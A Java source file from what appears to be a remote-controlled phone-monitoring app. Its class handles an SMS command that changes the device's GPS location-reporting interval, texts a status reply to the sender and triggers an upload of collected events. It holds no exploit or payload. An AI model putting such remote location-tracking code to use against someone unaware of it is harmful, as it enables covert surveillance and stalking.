package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSUpdateLocationInterval extends RmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSUpdateLocationInterval(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getUpdateLocationIntervalCmd());
		try {
			Preference pref = Global.getPreference();
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			int gpsIndex = rmtCmdLine.getGpsIndex();
			if (gpsIndex > 0) {
				GPSOption gpsOpt = gps.getGpsOption();
				gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[gpsIndex - 1]);
				gps.setGpsOption(gpsOpt);
			}
			pref.commit(gps);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOC_ENABLE);
			if (gps.isEnabled()) {
				responseMessage.append(RmtCmdTextResource.ON);
			} else {
				responseMessage.append(RmtCmdTextResource.OFF);
			}
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.UPDATE_INTERVAL);
			if (gpsIndex > 0) {
				responseMessage.append(ApplicationInfo.LOCATION_TIMER_REPLY[gpsIndex - 1]);
			} else {
				responseMessage.append(RmtCmdTextResource.ZERO);
			}
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOC_METHODS);
			responseMessage.append(RmtCmdTextResource.LOC_AGPS_METHODS);
			responseMessage.append(Constant.COMMA_AND_SPACE);
			responseMessage.append(RmtCmdTextResource.LOC_GLOC_METHODS);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOC_NOT_SUPPORTED);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdUpdateGPSInterval.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
